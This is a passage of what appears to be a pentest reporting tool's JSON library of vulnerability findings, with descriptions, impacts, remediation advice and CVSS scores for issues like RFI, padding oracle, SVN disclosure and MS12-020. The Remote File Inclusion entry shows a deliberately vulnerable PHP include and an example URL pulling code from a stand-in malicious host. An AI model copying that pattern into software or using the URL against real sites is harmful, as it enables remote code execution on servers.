information found in the WordPress readme.html.\n","poc":null,"impact":"When this information is collected, it is possible to search online for public vulnerabilities related to that specific version. Unfortunately the research did not reveal any good vulnerabilities and the next step was to enumerate the WordPress plugins. - See more at: http://www.dionach.com/blog/a-case-study-with-wordpress#sthash.L8FfS7LJ.dpuf\n","remediation":"It is recommended to delete the readme.html file from the root of your WordPress installation. Keep in mind that each time you upgrade your WordPress, the file readme.html file is copied again to your WordPress installation. Therefore It is very important to delete the readme.html file each time you upgrade WordPress.\nAlternatively, if you think you will not always remember to delete the WordPress readme.html file, like I do, you can restrict access to it using a .htaccess file. Read the WordPress tutorial How to restrict access to WordPress files with htaccess(http://www.wpwhitesecurity.com/wordpress-security/restrict-access-wordpress-files-htaccess/) to learn how to restrict access to WordPress readme.html file.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":517,"plugin_id":null,"title":"FCKeditor Arbitrary File Upload Vulnerability","type":null,"description":"Multiple vendor applications utilize FCKeditor. FCKeditor contains functionality to handle file uploads and file management.The \"FCKeditor Arbitrary File Upload\" vulnerability provides attackers with a method to upload arbitrary files (such as web-based shells), and execute commands on affected servers. However, privileges are limited to those assigned to the web server service account or user.\n","poc":null,"impact":"Provides attackers with a method to upload arbitrary files (such as web-based shells), and execute commands on affected servers. However, privileges are limited to those assigned to the web server service account or user.\n","remediation":"It is recommended to disable the file upload functionality in FCKeditor (if not required).\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":518,"plugin_id":null,"title":"Development Site Externally Accessible","type":null,"description":"The development site under review was found to be publicly accessible. As the site is likely to contain development code there is a much higher risk of compromise of the site which could lead to compromise of the main site where issues, credentials, hardware etc are shared.\n","poc":null,"impact":"As the site is likely to contain development code there is a much higher risk of compromise of the site which could lead to compromise of the main site where issues, credentials, hardware etc are shared.\n","remediation":"It is strongly recommended that the development site is IP restricted to prevent unauthorized access.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":519,"plugin_id":null,"title":"Information Leak through WSDL File","type":null,"description":"An information exposure may occur if any of the following apply:\nThe WSDL file is accessible to a wider audience than intended.\nThe WSDL file contains information on the methods/services that should not be publicly accessible or information about deprecated methods. This problem is made more likely due to the WSDL often being automatically generated from the code.\nInformation in the WSDL file helps guess names/locations of methods/resources that should not be publicly accessible.\n","poc":null,"impact":"The attacker may find sensitive information located in the WSDL file.\n","remediation":"Limit access to the WSDL file as much as possible. If services are provided only to a limited number of entities, it may be better to provide WSDL privately to each of these entities than to publish WSDL publicly.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":520,"plugin_id":null,"title":"Redirect Without Exit","type":null,"description":"During the testing, we observed that the application redirects indefinitely upon navigating to the vulnerable URL. With this vulnerability, it is possible to force the user browser into an indefinite loop which will create a resource deadlock in old version browsers.\n","poc":null,"impact":"It is possible to create a resource deadlock in OLD version browsers.\n","remediation":"loop exiting logic is to be implemented at a certain case.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":521,"plugin_id":null,"title":"SSH Access is allowed over Internet","type":null,"description":"Exposing SSH Access to direct connections is risky. This setup gives remote attackers the opportunity to guess logon credentials.\n","poc":null,"impact":"An attacker might guess the credentials and can compromise the machine.\n","remediation":"Make sure that SSH is not allowed to public over internet .In case Internet access is required, make sure only trusted IPs are whitelisted and everything else is blocked.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":522,"plugin_id":null,"title":"Files or Directories Accessible to External Parties","type":null,"description":"Application exposes default files of templates and plugins used to external users. As these files contain information about the plugins, plugin versions, framework information etc., an attacker can use these files to enumerate the framework and can plan his further attacks based on the vulnerabilities available on the framework.\n","poc":null,"impact":"An attacker can use these files to enumerate the framework and can plan his further attacks based on the vulnerabilities available on the framework.\n","remediation":"Make sure unnecessary files are not available publicly.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":523,"plugin_id":null,"title":"Multiple Accounts with same Email ID Accepted","type":null,"description":"Application is allowing users to create multiple accounts on same email id. This can be exploited by malicious users in multiple ways.\n","poc":null,"impact":"Attacker can exploit this in multiple manners:\n--If there is no validation on server side, an attacker can create an account to compromise a person's account by applying new password while creating new account. If application is using email id as user id, this might result in account compromise.\n--In case email id is not being used as user id, an attacker can create N number of accounts with the same email id and thus can create overhead records in the server.\n\n","remediation":"Make sure, one email id is allowed only once for creating an account. Availability of email id must be checked before creation of account.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":524,"plugin_id":null,"title":"Verbose Error Messages","type":null,"description":"The application server generates error messages that include information revealing details about its implementation. Verbose error messages can include, but are not limited to, stack traces, XML parser errors, and SQL exceptions.\nVerbose error messages may expose sensitive details about the application, including its design, underlying libraries, middleware, OS, and server, and interactions with other components, giving attackers information that may aid them in more quickly targeting the system with specific types of attacks against those components.","poc":"","impact":"","remediation":"Never display sensitive information in error messages. Display generic error messages to the user regardless of the type of failure that has occurred and log the details of the error to the server. If details about the error are needed for debugging or support reasons, a unique identifier can be created and displayed to the user along with a generic error message for reference. The same unique identifier can be included with the error that is logged to the server so that it can be easily correlated with the error.","cvss_base_score":2.6,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2019-01-16 06:55:21","approved":1,"v_likelihood":"Medium","v_impact":"Minimal","steps_to_reproduce":"","likelihood_text":""},{"id":525,"plugin_id":null,"title":"Application Error","type":null,"description":"The application returns an HTTP 500 Server Error response when invalid or malformed data is submitted to the application. The following are various ways GET/POST parameters can be modified to cause the application to return an HTTP 500 Server Error:\n--Remove a parameter\n--Remove a parameter value\n--Set a parameter's value to null\n--Set a paramete'rs value to a numeric overflow\n--Set a paramete'rs value to a string containing hazardous characters, such as <,>);\n--Append some string to a numeric parameter value\n--Append \".\" (dot) or \"[]\" (angle brackets) to the parameter name\n\n","poc":null,"impact":"Receiving HTTP 500 errors from the server indicates that the application may have entered an unexpected or unhandled state. If the error occurs while business logic is being executed, a transaction may be left in a partially completed state. While this does not provide an attacker with specific information useful for crafting further attacks against the system or application, making requests to the server that intentionally trigger server errors may cause unexpected behavior that benefits the attacker or negatively impacts other users.\n","remediation":"Perform sanitization on all input received by the application to ensure that only valid characters are entered and all necessary inputs are supplied. In general, at least the following sanitization checks should be performed:\n--Check incoming requests for the presence of all expected parameters and values. When a parameter is missing, issue a proper error message or use default values.\n--Verify that all inputs consist of valid characters (after decoding). For example, an input value containing the null byte (encoded as %00), apostrophe, quotes, etc. should be rejected unless those characters are considered valid input.\n--Enforce values in their expected ranges and types. If the application expects a certain parameter to have a value from a certain set, then the application should ensure that the value it receives indeed belongs to the set. For example, if the application expects a value in the range 10...99, then it should make sure that the value is numeric, and that its value falls in the set 10...99.\n--Verify that the data belongs to the set offered to the client.\n--Do not output debugging error messages and exceptions in a production environment.\n\n","cvss_base_score":5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Medium","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":526,"plugin_id":null,"title":"ASP.NET Padding Oracle Vulnerability","type":null,"description":"ASP.Net uses encryption to hide sensitive data and protect it from tampering by the client. However, a vulnerability in the ASP.Net encryption implementation can allow an attacker to decrypt and tamper with this data. This vulnerability exists in most versions of ASP.NET.\n","poc":null,"impact":"An attacker who exploited this vulnerability could view data, such as the View State, which was encrypted by the target server, or read data from files on the target server, such as web.config. This would allow the attacker to tamper with the contents of the data. By sending back the altered contents to an affected server, the attacker could observe the error codes returned by the server.\n","remediation":"Microsoft issued MS10-070 to address the Padding Oracle Vulnerability.Download and apply the fix from the following link.\nhttp://technet.microsoft.com/en-us/security/bulletin/MS10-070\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":527,"plugin_id":null,"title":"Oracle Reports Server 10g Multiple Remote Cross-Site Scripting Vulnerability","type":null,"description":"Multiple remote cross-site scripting vulnerabilities affect Oracle Reports Server. These issues are due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated Web content.\nAn attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.\n","poc":null,"impact":"An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.\n","remediation":"Oracle has released a Critical Patch Update to address these issues.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":530,"plugin_id":null,"title":"Remote File Inclusion","type":null,"description":"The application includes files from locations off-server based on paths constructed with untrusted user-supplied input. File includes are used by many modern web frameworks to dynamically add the contents of a file to an existing web page at runtime. A remote file inclusion (RFI) vulnerability occurs when the application includes an attacker-controlled file that is then executed or rendered in some way.\nFor example, consider the following PHP code example which is used to select an action to perform on a trade:\n<pre><?php if (isset( $_GET['ACTION'] ) ) {     include( $_GET['ACTION'] . '.php' ); } ?> <form method=\"get\"> <select name=\"ACTION\"> <option value=\"buy\">Buy</option> <option value=\"sell\">Sell</option> </select> <input type=\"submit\"> </form> </pre>\nThe code snippet expects only buy.php and sell.php to be submitted as options, but any arbitrary file and path will be accepted. The example below shows an attacker-controlled file being passed directly to the application via the query string parameter:\n<pre>http://targetpage.com/vulnerable.php?ACTION=http://malicious.com/phishing </pre>\nThis inclusion attack will result in the included file name becoming:\n<pre>http://malicious.com/phishing.php </pre>\n","poc":null,"impact":"Malicious code pulled from a remote location may be executed server-side in the server user's context if the file include is not contained in a wrapper; it may also be executed client-side if the contents of the included file are inserted into responses returned to the victim. This may have a wide range of effects on the server and end-users, including (but not limited to) the following:\n--Theft, destruction or modification of sensitive data stored on the affected system.\n--Denial of service attacks that aim to take down the server.\n--Client-side code execution (Cross-site scripting, web page defacement, etc.)\n--Launching an interactive shell on the system to more easily profile the system and its contents, execute more complex commands, or begin network reconnaissance to further infiltrate the internal network.\n\n","remediation":"Paths to remote files included in the application should not be generated using user-supplied or other untrusted data. If data supplied by the client or other untrusted sources must be used, strict input validation via a whitelist must be used to deny or filter out invalid URLs, file names and control characters that would be interpreted by the application.\n","cvss_base_score":7.5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":531,"plugin_id":null,"title":"Missing Password Field Masking","type":null,"description":"Basic web application security measures include masking all passwords entered by a user when logging in to a web application. Normally, each character in a password entered by a user is instead represented with an asterisk.\nThe application fails to mask passwords during entry, increasing the potential for attackers to observe and capture passwords.\n","poc":null,"impact":"The application fails to mask passwords during entry, increasing the potential for attackers to observe and capture passwords.\n","remediation":"Recommendations include requiring all password fields in your web application be masked to prevent other users from seeing this information.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":532,"plugin_id":null,"title":".NET solution File Download","type":null,"description":"A solution file contains sensitive information about the application, the projects it is constructed of, script file names and locations etc. By revealing such a file, an attacker can get the information he needs in order to plan further attacks, such as source code disclosure, on the server.\n","poc":null,"impact":"A solution file contains sensitive information about the application, the projects it is constructed of, script file names and locations etc. By revealing such a file, an attacker can get the information he needs in order to plan further attacks, such as source code disclosure, on the server.\n","remediation":"Refrain from storing project solution files under the virtual web server root directory.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:10","updated_at":"2018-11-12 09:25:10","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":533,"plugin_id":null,"title":"SVN Disclosure","type":null,"description":"A .svn/entries file was found within the web root. This file is created by the popular Subversion version control system and it contains a list of files and directories under version control. The entries file is one of several Subversion metadata files created within \".svn/\" subdirectories in the working directory (the local directory where files are checked out by a developer). It is common for these metadata directories to be copied up into the web root by developers.\n","poc":null,"impact":"The .svn/entries file is a serious information leak, as it can give attackers information about hidden files and directories within the web root.\n","remediation":"Remove .svn metada subdirectories from web root\nEnsure that .svn metadata directories are never present within the web root. Tell developers to use the \"svn export\" command prior to deploying their code onto the server, rather than \"svn checkout\" (the \"export\" command does not create any local .svn metadata directories).\nNOTE: Using the typical \"ls\" command in UNIX will not reveal the presence of .svn directories because the leading period in the directory name makes it \"hidden\". Use \"ls -a\" or the \"find\" command to find these directories.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":534,"plugin_id":null,"title":"Information Leakage via Code Comments","type":null,"description":"Comments in the application source code contain sensitive information. While code comments are useful for maintenance and readability, sensitive information may be exploited by users authorized to access the code, or leaked to unauthorized individuals who gain access to the code base. Examples of sensitive information commonly found in code comments include (but are not limited to) test credentials, internal email addresses, sample data that illustrates data formats, NPI data such as SSNs and account numbers, IP addresses for internal subsystems, etc. Comments may also give away information about the application's business logic and control flow that would otherwise not be obvious to someone simply reading the code. For example, a comment may point out a bug that is not fixed, or provide information about application logic that could not be discerned by reading the code alone.\n","poc":null,"impact":"Sensitive data stored in code is at risk of exposure to various parties, including:\n--All developers with access to the source code\n--Any individual who gains access to the source code by accident (e.g. through lax access control policies set for code repositories)\n--Any individual who gains access to the source code through malicious action (e.g. through source code disclosure in the running application instance)\n\n--Application and other credentials leaked may provide an attacker with unauthorized access to databases and other resources, or allow them to impersonate legitimate application users\n--Details regarding the internal network's structure, internal IP addresses, and other company-related information may be useful for an attacker performing reconnaissance, to further penetrate the internal network, target employees directly, etc.\n--Details regarding business logic and application control flow may allow an attacker to more efficiently craft exploits against the running application\n\n","remediation":"Code comments must be worded carefully so that they are useful for application code maintenance, but do not expose any sensitive user or application information. Credentials, IP addresses, PII, internal email addresses, identifiers and other unnecessary information must never be included in code comments.\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:H/Au:N/C:C/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":535,"plugin_id":null,"title":"PHP phpinfo.php Information Disclosure","type":null,"description":"We found phpinfo() output in a document. phpinfo() is a debug functionality that prints out detailed information on both the system and the PHP configuration.\n","poc":null,"impact":"An attacker can obtain information such as:\n--Exact PHP version.\n--Exact OS and its version.\n--Details of the PHP configuration.\n--Internal IP addresses.\n--Server environment variables.\n--Loaded PHP extensions and their configurations.\n\n","remediation":"Remove the pages that calls phpinfo() from the web server.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":536,"plugin_id":null,"title":"WS_FTP log file found","type":null,"description":"A WS_FTP.LOG file was found in the web root. These files are created by the WS_FTP program when transferring files. Sometimes these files inadvertently get transferred into the web root.\n","poc":null,"impact":"A WS_FTP.LOG file is a serious information leak as it can contain information about hidden files and directories on the web root, as well as information about usernames and hostnames used to transfer files to/from the web server.\n","remediation":"Remove WS_FTP.LOG files from the web root.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":537,"plugin_id":null,"title":"MS12-020: Vulnerabilities in Remote Desktop Could Allow Remote Code Execution","type":null,"description":"An arbitrary remote code vulnerability exists in the implementation of the Remote Desktop Protocol (RDP) on the remote Windows host. The vulnerability is due to the way that RDP accesses an object in memory that has been improperly initialized or has been deleted.\nIf RDP has been enabled on the affected system, an unauthenticated, remote attacker could leverage this vulnerability to cause the system to execute arbitrary code by sending a sequence of specially crafted RDP packets to it.\nThis plugin also checks for a denial of service vulnerability in Microsoft Terminal Server.\nNote that this script does not detect the vulnerability if the 'Allow connections only from computers running Remote Desktop with Network Level Authentication' setting is enabled or the security layer is set to 'SSL (TLS 1.0)' on the remote host.\n","poc":null,"impact":"If RDP has been enabled on the affected system, an unauthenticated, remote attacker could leverage this vulnerability to cause the system to execute arbitrary code by sending a sequence of specially crafted RDP packets to it.\n","remediation":"Restrict RDP access over internet.\nMicrosoft has released a set of patches for Windows XP, 2003, Vista, 2008, 7, and 2008 R2.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":538,"plugin_id":null,"title":"SharePoint UserDisp Enumeratipn","type":null,"description":"UserDispEnum is a new SharePoint user enumeration tool that exploits insecure access controls to the /_layouts/UserDisp.aspx?ID=1 page. This utility cycles through the integer ID values from 1 onward to identify valid users, account names, and other related profile information that can easily be extracted from the SharePoint user profiles.\n","poc":null,"impact":"This utility cycles through the integer ID values from 1 onward to identify valid users, account names, and other related profile information that can easily be extracted from the SharePoint user profiles.The SharePoint user account can disclose sensitive information. This information can be used to launch further attacks.\n","remediation":"Restrict unauthorized access to this page.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":539,"plugin_id":null,"title":"htaccess Disclosure","type":null,"description":"The target webserver sets improper permissions for .htaccess files. A remote attacker could exploit this vulnerability to gain unauthorized access to the localconfig file and obtain a user's database password and other sensitive information.\n","poc":null,"impact":"A remote attacker could exploit this vulnerability to gain unauthorized access to the localconfig file and obtain a user's database password and other sensitive information.\n","remediation":"Review permissions on .htaccess file and ensure that this file does not get exposed to end users.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":540,"plugin_id":null,"title":"Account Compromise through Forgot Password","type":null,"description":"Any user account can be compromised through the link sent to the user for password reset if his\nusername(email-id) is known.\n","poc":null,"impact":"Password of any user can be reset provided his username/email is known.\n","remediation":"Review the password reset logic and ensure that userid or Email does not get disclosed to the end users in password reset link.Additionally follow the OWASP best practices for the implementation of password reset logic. The reset flow should never send an actual password to the user at any time over any channel.\nThe reset form should not expose account enumeration vulnerability.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":541,"plugin_id":null,"title":"Missing Initialization","type":null,"description":"The flash player accepts object parameters such as AllowScriptAccess. The AllowScriptAccess parameter is used when a parent SWF loads a child SWF and determines whether the loaded SWF will have the same script access to the web page as the loading SWF. If the parameter is set to 'always' any SWF loaded by the parent from any domain could inject a script into the hosting web page.\n","poc":null,"impact":"It is possible to steal or manipulate customer session and cookies, which might be used to impersonate a legitimate user, allowing the hacker to view or alter user records, and to perform transactions as that user.\n","remediation":"Set the AllowScriptAccess parameter to 'sameDomain' which tells the Flash Player that only SWF files loaded from the same domain as the parent SWF will have script access to the hosting web page.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":542,"plugin_id":null,"title":"Flash Parameter AllowScriptAccess Was Set To Always","type":null,"description":"The flash player accepts object parameters such as AllowScriptAccess. The AllowScriptAccess parameter is used when a parent SWF loads a child SWF and determines whether the loaded SWF will have the same script access to the web page as the loading SWF. If the parameter is set to 'always' any SWF loaded by the parent from any domain could inject a script into the hosting web page.\n","poc":null,"impact":"If AllowScriptAccess is set to \"always\" then ActionScript in a SWF is permitted to call JavaScript in the HTML page that contains it.\n","remediation":"Set the AllowScriptAccess parameter to 'sameDomain' which tells the Flash Player that only SWF files loaded from the same domain as the parent SWF will have script access to the hosting web page.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":543,"plugin_id":null,"title":"Error page server version disclosure","type":null,"description":"By requesting a page that doesn't exist, an error page was returned. This error page contains the web server version number and a list of modules enabled on this server. This information can be used to conduct further attacks.\n","poc":null,"impact":"In a production context this information is a potential security hole and attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application.\n","remediation":"Set up a custom error page and redirect all server generated errors to that custom error page.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":544,"plugin_id":null,"title":"IBM WebSphere Application Server WAR File Information Disclosure","type":null,"description":"A vulnerability has been reported in WebSphere Application Server, which can be exploited by malicious people to disclose potentially sensitive information.\nThe vulnerability is caused due to an unspecified error, which can be exploited to display application specific files contained within a war file, e.g. files under the \"web-inf\" and \"meta-inf\" directories.\nThe vulnerability is reported in IBM WebSphere Application Server versions 5.1, 6.0, 6.1, and 7.0.\n","poc":null,"impact":"The vulnerability is caused due to an unspecified error, which can be exploited to display application specific files contained within a war file, e.g. files under the \"web-inf\" and \"meta-inf\" directories.\n","remediation":"Solution\nApply APAR PK81387.\nwww-01.ibm.com/support/docview.wss\nWebSphere 6.0.x:\nApply Fix Pack 35 (6.0.2.35).\nWebSphere 6.1.x:\nApply Fix Pack 23 (6.1.0.23).\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":545,"plugin_id":null,"title":"Sitemap Found","type":null,"description":"We identified Sitemap file on the target web site. This issue is reported as extra information.\n","poc":null,"impact":"This issue is reported as extra information, there is no direct impact resulting from this.\n","remediation":"ATTENTION: Legacy iViz finding did not contain any information; any finding writeup for this finding must be peer-reviewed.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":546,"plugin_id":null,"title":"Perl: Open Function Uses Two Arguments","type":null,"description":"The \"open\" function is used with two arguments instead of three. The two-argument version of the \"open\" function can lead to hijacking of file streams, files being overwritten, as well as malicious code being executed in the Perl Script. This happens because the two-argument version of \"open\" has no way to discern what permissions the file should be opened with. By default the \"open\" function assumes that the file should be set to read only, but if a malicious user passes in a file name that has a control character in it Perl will act upon it. For example the following code snippet will open the $output file with write permissions since the \"open\" function will recognize the \">\" as a control character.\n<pre><code class=\"perl\">open( $fh, \">$output\"); </pre>\nBy injecting any of the shorthand flags into a file name, such as \"<\", \">\", \">>\", \"+<\", \"+>\", or \"+>>\" the file permissions the \"open\" function will use will be altered. This attack can then become critical 